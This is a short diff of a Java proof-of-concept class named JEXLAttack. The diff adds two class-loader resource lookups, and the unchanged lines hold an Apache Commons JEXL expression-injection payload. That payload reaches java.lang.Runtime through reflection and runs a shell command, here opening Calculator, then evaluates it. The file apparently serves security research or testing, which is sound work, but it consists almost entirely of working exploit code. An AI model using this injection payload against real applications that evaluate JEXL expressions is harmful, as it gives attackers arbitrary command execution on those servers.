@@ -7,6 +7,10 @@ import org.apache.commons.jexl3.*;
  */
 public class JEXLAttack {
     public static void main(String[] args) {
+        Thread.currentThread().getContextClassLoader().getResource("");
+        Thread.currentThread().getContextClassLoader().getParent().getResource("");
+
+
         String poc = "''.class.forName('java.lang.Runtime').getRuntime().exec('open -a Calculator.app')";
         System.out.println(eval(poc));;
     }
